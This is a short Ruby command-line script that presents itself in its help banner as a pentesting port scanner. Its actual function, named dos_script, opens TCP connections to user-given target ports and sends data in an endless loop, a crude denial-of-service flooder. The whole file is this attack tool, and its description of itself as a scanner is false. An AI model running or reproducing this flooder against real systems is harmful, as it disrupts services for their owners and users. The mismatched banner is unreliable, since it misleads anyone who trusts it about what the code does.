require 'socket'
require 'optparse'

options = {}

OptionParser.new do |parser| 
  parser.banner = <<-BANNER
Version 1.0
By: icrossu
Github: github.com/icrossu

This script is a tool for pentesting, specifically for scanning ports on a target.
If you need help using the script, use -h.

Available Options:

-h, --help                         Show this help menu
-tTARGET, --target=TARGET          Specify the target URL or IP
-pPORTS, --ports=PORTS             Specify the ports you want to send packets to
  BANNER

  parser.on("-tTARGET", "--target=TARGET", "Specify the target URL or IP") do |target|
    options[:target] = target
  end

  parser.on("-pPORTS", "--ports=PORTS", "Comma-separated list of ports") do |ports|
    options[:ports] = ports.split(',').map(&:to_i)
  end
end.parse!

if options[:target].nil?
  puts "No target specified. Use -t to specify a target."
  exit
end

if options[:ports].nil? || options[:ports].empty?
  puts "No ports specified. Use -p to specify ports."
  exit
end

def dos_script(target, ports)
  ports.each do |port|
    begin
      s = TCPSocket.new(target, port)
      puts "Initializing packet sending on #{target}:#{port}."
      
      loop do
        s.send("Packet data", 0)
        puts "Package sent for: #{target}:#{port}"
      end

    rescue StandardError => e
      puts "An error occurred on port #{port}: #{e.message}"
    ensure
      puts "Socket closed for port #{port}."
      s.close if s
    end
  end
end

dos_script(options[:target], options[:ports])
